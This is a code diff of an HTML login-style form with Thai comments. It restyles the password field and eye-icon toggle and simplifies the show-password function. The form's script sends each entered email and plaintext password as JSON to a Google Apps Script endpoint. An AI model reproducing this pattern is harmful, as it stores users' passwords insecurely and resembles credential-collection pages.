@@ -59,7 +59,7 @@
     }
 
     input[type="email"],
-    .password-wrapper,
+    input[type="password"],
     button {
       width: 100%;
       font-size: 1rem;
@@ -67,7 +67,8 @@
     }
 
     input[type="email"] {
-      padding: 0.8rem 1.2rem;
+      padding: 0.8rem;
+      padding-left: 1.2rem;
       margin-bottom: 1.2rem;
       border: 1px solid #ccc;
       text-align: left;
@@ -78,35 +79,25 @@
       margin-bottom: 1.2rem;
     }
 
-    #password {
-      width: 100%;
-      padding: 0.8rem 2.8rem 0.8rem 1.2rem;  /* เผื่อที่ให้ไอคอน */
+    .password-wrapper input {
+      padding: 0.8rem;
+      padding-left: 1.2rem;
+      padding-right: 2.5rem;
       border: 1px solid #ccc;
-      border-radius: 8px;
+      width: 100%;
       text-align: left;
+      border-radius: 8px;
     }
 
     .toggle-password {
       position: absolute;
       top: 50%;
-      right: 0.8rem;
+      right: 1rem;
       transform: translateY(-50%);
-      background: none;
-      border: none;
       cursor: pointer;
-      padding: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
     }
 
-    .toggle-password svg {
-      width: 20px;
-      height: 20px;
-      fill: #666;
-    }
-
-    button[type="submit"] {
+    button {
       padding: 0.8rem;
       background: #222;
       color: white;
@@ -115,7 +106,7 @@
       cursor: pointer;
     }
 
-    button[type="submit"]:hover {
+    button:hover {
       background: #000;
     }
   </style>
@@ -134,11 +125,13 @@
         <label for="password">Password</label>
         <div class="password-wrapper">
           <input type="password" id="password" name="password" required placeholder="Value" />
-          <button type="button" class="toggle-password" onclick="togglePassword()">
-            <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-              <path id="eyePath" d="M12 5C7 5 2.7 8.6 1 12c1.7 3.4 6 7 11 7s9.3-3.6 11-7c-1.7-3.4-6-7-11-7zm0 12a5 5 0 110-10 5 5 0 010 10z"/>
+          <span class="toggle-password" onclick="togglePassword()">
+            <!-- ไอคอนรูปตา (SVG) -->
+            <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 0 24 24" width="20" fill="#888">
+              <path d="M0 0h24v24H0z" fill="none"/>
+              <path d="M12 6.5C7 6.5 3.1 9.8 1 14c2.1 4.2 6 7.5 11 7.5s8.9-3.3 11-7.5c-2.1-4.2-6-7.5-11-7.5zm0 13c-3.9 0-7.1-2.5-8.6-6 1.5-3.5 4.7-6 8.6-6s7.1 2.5 8.6 6c-1.5 3.5-4.7 6-8.6 6zm0-10a4 4 0 100 8 4 4 0 000-8z"/>
             </svg>
-          </button>
+          </span>
         </div>
 
         <button type="submit">Submit</button>
@@ -147,6 +140,11 @@
   </div>
 
   <script>
+    function togglePassword() {
+      const input = document.getElementById("password");
+      input.type = input.type === "password" ? "text" : "password";
+    }
+
     const form = document.querySelector("#form");
     const scriptURL = "https://script.google.com/macros/s/AKfycby6SuSSgdHzk765vOObTNLXYNN0stvUi5qFtxFjhCqC_booYDtzbYTDm2sSVE21h9D03Q/exec";
 
@@ -160,27 +158,15 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email, password }),
       })
-      .then(response => {
-        alert("ส่งข้อมูลสำเร็จแล้ว!");
-        form.reset();
-      })
-      .catch(error => {
-        alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
-        console.error("Error!", error.message);
-      });
+        .then(response => {
+          alert("ส่งข้อมูลสำเร็จแล้ว!");
+          form.reset();
+        })
+        .catch(error => {
+          alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
+          console.error("Error!", error.message);
+        });
     });
-
-    function togglePassword() {
-      const pwd = document.getElementById("password");
-      const icon = document.getElementById("eyePath");
-      if (pwd.type === "password") {
-        pwd.type = "text";
-        icon.setAttribute("d", "M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12zm11 3a3 3 0 100-6 3 3 0 000 6z");
-      } else {
-        pwd.type = "password";
-        icon.setAttribute("d", "M12 5C7 5 2.7 8.6 1 12c1.7 3.4 6 7 11 7s9.3-3.6 11-7c-1.7-3.4-6-7-11-7zm0 12a5 5 0 110-10 5 5 0 010 10z");
-      }
-    }
   </script>
 </body>
 </html>
